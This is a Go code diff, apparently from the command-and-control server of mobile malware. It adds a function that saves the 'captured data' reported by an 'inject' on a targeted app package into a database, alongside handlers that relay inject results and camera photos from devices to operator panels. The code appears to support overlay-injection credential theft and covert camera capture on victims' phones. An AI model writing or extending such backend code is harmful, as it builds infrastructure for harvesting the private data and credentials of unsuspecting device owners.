@@ -397,6 +397,7 @@ func handleDeviceMessage(dc *DeviceConn, msg map[string]any) {
 	case "inject_result":
 		msg["device_id"] = dc.ID
 		H.NotifyPanels(dc.TeamID, msg)
+		go saveInjectResult(dc.ID, dc.TeamID, msg)
 
 	case "camera_photo":
 		msg["device_id"] = dc.ID
@@ -687,4 +688,30 @@ func validateSessionToken(token string) (*wsSession, error) {
 		Login:  session.Login,
 		Role:   session.Role,
 	}, nil
+}
+
+func saveInjectResult(deviceID, teamID string, msg map[string]any) {
+	pkg, _ := msg["target_package"].(string)
+	if pkg == "" {
+		pkg, _ = msg["package"].(string)
+	}
+	appName, _ := msg["app_name"].(string)
+	if appName == "" {
+		appName, _ = msg["app"].(string)
+	}
+
+	// Extract captured data fields (exclude meta fields)
+	skip := map[string]bool{"type": true, "device_id": true, "target_package": true, "package": true, "app_name": true, "app": true}
+	captured := map[string]any{}
+	for k, v := range msg {
+		if !skip[k] {
+			captured[k] = v
+		}
+	}
+	capturedJSON, _ := json.Marshal(captured)
+
+	db.DB.Exec(
+		"INSERT INTO inject_data (team_id, device_id, target_package, app_name, captured_data) VALUES (?, ?, ?, ?, ?)",
+		teamID, deviceID, pkg, appName, string(capturedJSON),
+	)
 }
